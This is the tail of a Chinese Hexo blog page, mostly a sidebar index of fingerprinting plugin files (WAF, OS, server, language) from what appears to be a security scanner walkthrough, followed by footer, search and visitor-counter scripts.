nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-flash-py"><span class="nav-number">14.4.6.</span> <span class="nav-text">plugins/fingerprint/language/flash.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-php-py"><span class="nav-number">14.4.7.</span> <span class="nav-text">plugins/fingerprint/language/php.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-ruby-py"><span class="nav-number">14.4.8.</span> <span class="nav-text">plugins/fingerprint/language/ruby.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-asp-py"><span class="nav-number">14.4.9.</span> <span class="nav-text">plugins/fingerprint/language/asp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#os"><span class="nav-number">14.5.</span> <span class="nav-text">os</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-unix-py"><span class="nav-number">14.5.1.</span> <span class="nav-text">plugins/fingerprint/os/unix.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-ibm-py"><span class="nav-number">14.5.2.</span> <span class="nav-text">plugins/fingerprint/os/ibm.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-linux-py"><span class="nav-number">14.5.3.</span> <span class="nav-text">plugins/fingerprint/os/linux.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-solaris-py"><span class="nav-number">14.5.4.</span> <span class="nav-text">plugins/fingerprint/os/solaris.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-bsd-py"><span class="nav-number">14.5.5.</span> <span class="nav-text">plugins/fingerprint/os/bsd.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-mac-py"><span class="nav-number">14.5.6.</span> <span class="nav-text">plugins/fingerprint/os/mac.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-os-windows-py"><span class="nav-number">14.5.7.</span> <span class="nav-text">plugins/fingerprint/os/windows.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#server"><span class="nav-number">14.6.</span> <span class="nav-text">server</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-server-server-py"><span class="nav-number">14.6.1.</span> <span class="nav-text">plugins/fingerprint/server/server.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#waf"><span class="nav-number">14.7.</span> <span class="nav-text">waf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-yundun-py"><span class="nav-number">14.7.1.</span> <span class="nav-text">plugins/fingerprint/waf/yundun.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-urlscan-py"><span class="nav-number">14.7.2.</span> <span class="nav-text">plugins/fingerprint/waf/urlscan.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-datapower-py"><span class="nav-number">14.7.3.</span> <span class="nav-text">plugins/fingerprint/waf/datapower.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-sucuri-py"><span class="nav-number">14.7.4.</span> <span class="nav-text">plugins/fingerprint/waf/sucuri.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-aws-py"><span class="nav-number">14.7.5.</span> <span class="nav-text">plugins/fingerprint/waf/aws.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-senginx-py"><span class="nav-number">14.7.6.</span> <span class="nav-text">plugins/fingerprint/waf/senginx.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-baidu-py"><span class="nav-number">14.7.7.</span> <span class="nav-text">plugins/fingerprint/waf/baidu.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-safe3-py"><span class="nav-number">14.7.8.</span> <span class="nav-text">plugins/fingerprint/waf/safe3.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-secureiis-py"><span class="nav-number">14.7.9.</span> <span class="nav-text">plugins/fingerprint/waf/secureiis.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-anquanbao-py"><span class="nav-number">14.7.10.</span> <span class="nav-text">plugins/fingerprint/waf/anquanbao.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-teros-py"><span class="nav-number">14.7.11.</span> <span class="nav-text">plugins/fingerprint/waf/teros.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-sitelock-py"><span class="nav-number">14.7.12.</span> <span class="nav-text">plugins/fingerprint/waf/sitelock.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-netcontinuum-py"><span class="nav-number">14.7.13.</span> <span class="nav-text">plugins/fingerprint/waf/netcontinuum.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-cloudflare-py"><span class="nav-number">14.7.14.</span> <span class="nav-text">plugins/fingerprint/waf/cloudflare.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-nsfocus-py"><span class="nav-number">14.7.15.</span> <span class="nav-text">plugins/fingerprint/waf/nsfocus.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-airlock-py"><span class="nav-number">14.7.16.</span> <span class="nav-text">plugins/fingerprint/waf/airlock.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-stingray-py"><span class="nav-number">14.7.17.</span> <span class="nav-text">plugins/fingerprint/waf/stingray.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-safedog-py"><span class="nav-number">14.7.18.</span> <span class="nav-text">plugins/fingerprint/waf/safedog.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-profense-py"><span class="nav-number">14.7.19.</span> <span class="nav-text">plugins/fingerprint/waf/profense.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-comodo-py"><span class="nav-number">14.7.20.</span> <span class="nav-text">plugins/fingerprint/waf/comodo.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-modsecurity-py"><span class="nav-number">14.7.21.</span> <span class="nav-text">plugins/fingerprint/waf/modsecurity.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-blockdos-py"><span class="nav-number">14.7.22.</span> <span class="nav-text">plugins/fingerprint/waf/blockdos.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-hyperguard-py"><span class="nav-number">14.7.23.</span> <span class="nav-text">plugins/fingerprint/waf/hyperguard.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-sophos-py"><span class="nav-number">14.7.24.</span> <span class="nav-text">plugins/fingerprint/waf/sophos.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-requestvalidationmode-py"><span class="nav-number">14.7.25.</span> <span class="nav-text">plugins/fingerprint/waf/requestvalidationmode.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-cloudfront-py"><span class="nav-number">14.7.26.</span> <span class="nav-text">plugins/fingerprint/waf/cloudfront.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-netscaler-py"><span class="nav-number">14.7.27.</span> <span class="nav-text">plugins/fingerprint/waf/netscaler.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-uspses-py"><span class="nav-number">14.7.28.</span> <span class="nav-text">plugins/fingerprint/waf/uspses.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-binarysec-py"><span class="nav-number">14.7.29.</span> <span class="nav-text">plugins/fingerprint/waf/binarysec.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-paloalto-py"><span class="nav-number">14.7.30.</span> <span class="nav-text">plugins/fingerprint/waf/paloalto.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-wallarm-py"><span class="nav-number">14.7.31.</span> <span class="nav-text">plugins/fingerprint/waf/wallarm.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-incapsula-py"><span class="nav-number">14.7.32.</span> <span class="nav-text">plugins/fingerprint/waf/incapsula.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-knownsec-py"><span class="nav-number">14.7.33.</span> <span class="nav-text">plugins/fingerprint/waf/knownsec.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-jiasule-py"><span class="nav-number">14.7.34.</span> <span class="nav-text">plugins/fingerprint/waf/jiasule.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-edgecast-py"><span class="nav-number">14.7.35.</span> <span class="nav-text">plugins/fingerprint/waf/edgecast.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-varnish-py"><span class="nav-number">14.7.36.</span> <span class="nav-text">plugins/fingerprint/waf/varnish.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-dotdefender-py"><span class="nav-number">14.7.37.</span> <span class="nav-text">plugins/fingerprint/waf/dotdefender.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-newdefend-py"><span class="nav-number">14.7.38.</span> <span class="nav-text">plugins/fingerprint/waf/newdefend.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-isaserver-py"><span class="nav-number">14.7.39.</span> <span class="nav-text">plugins/fingerprint/waf/isaserver.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-kona-py"><span class="nav-number">14.7.40.</span> <span class="nav-text">plugins/fingerprint/waf/kona.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-asm-py"><span class="nav-number">14.7.41.</span> <span class="nav-text">plugins/fingerprint/waf/asm.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-fortiweb-py"><span class="nav-number">14.7.42.</span> <span class="nav-text">plugins/fingerprint/waf/fortiweb.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-yunsuo-py"><span class="nav-number">14.7.43.</span> <span class="nav-text">plugins/fingerprint/waf/yunsuo.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-trafficshield-py"><span class="nav-number">14.7.44.</span> <span class="nav-text">plugins/fingerprint/waf/trafficshield.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-sonicwall-py"><span class="nav-number">14.7.45.</span> <span class="nav-text">plugins/fingerprint/waf/sonicwall.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-barracuda-py"><span class="nav-number">14.7.46.</span> <span class="nav-text">plugins/fingerprint/waf/barracuda.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-bigip-py"><span class="nav-number">14.7.47.</span> <span class="nav-text">plugins/fingerprint/waf/bigip.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-ciscoacexml-py"><span class="nav-number">14.7.48.</span> <span class="nav-text">plugins/fingerprint/waf/ciscoacexml.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-betterwpsecurity-py"><span class="nav-number">14.7.49.</span> <span class="nav-text">plugins/fingerprint/waf/betterwpsecurity.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-denyall-py"><span class="nav-number">14.7.50.</span> <span class="nav-text">plugins/fingerprint/waf/denyall.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-radware-py"><span class="nav-number">14.7.51.</span> <span class="nav-text">plugins/fingerprint/waf/radware.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-expressionengine-py"><span class="nav-number">14.7.52.</span> <span class="nav-text">plugins/fingerprint/waf/expressionengine.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-armor-py"><span class="nav-number">14.7.53.</span> <span class="nav-text">plugins/fingerprint/waf/armor.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-waf-webknight-py"><span class="nav-number">14.7.54.</span> <span class="nav-text">plugins/fingerprint/waf/webknight.py</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chybeta</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  
      <!-- UY BEGIN -->
      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
      <!-- UY END -->
  




  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  



  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  
  


  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>
